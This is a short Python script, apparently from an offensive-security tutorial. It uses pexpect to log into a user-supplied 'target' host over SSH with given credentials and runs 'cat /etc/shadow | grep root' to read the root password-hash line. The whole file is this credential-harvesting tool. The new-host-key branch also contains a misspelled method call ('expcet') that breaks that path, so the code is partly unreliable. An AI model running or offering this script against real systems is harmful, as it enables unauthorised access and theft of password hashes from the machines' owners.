#!/usr/bin/python
# Written By: Sahar Hathiramani
# Date: 01/11/2021

import pexpect

PROMPT = ['# ', '>>> ', '> ', '\$ ', '$ ']

def send_command(connection, command):
    connection.sendline(command)
    connection.expect(PROMPT)
    print(connection.before)


def connect(user, host, password):
    ssh_newkey = 'Are you sure you want to continue connecting'
    connString = 'ssh ' + user + '@' + host
    spawn = pexpect.spawn(connString)
    ret = spawn.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
    if ret == 0:
        print('[-] Error Connecting')
        return
    
    if ret == 1:
        spawn.sendline('Yes')
        ret = spawn.expcet([pexpect.TIMEOUT, '[P|p]assword: '])
        if ret == 0:
            print('[-] Error Connecting')
            return
    spawn.sendline(password)
    spawn.expect(PROMPT)
    return spawn

def main():
    host = input("Enter Host to Target: ")
    user = input("Enter SSH Username: ")
    password = input("Enter SSH Password: ")
    shell = connect(user, host, password)
    send_command(shell, 'cat /etc/shadow | grep root')

main()
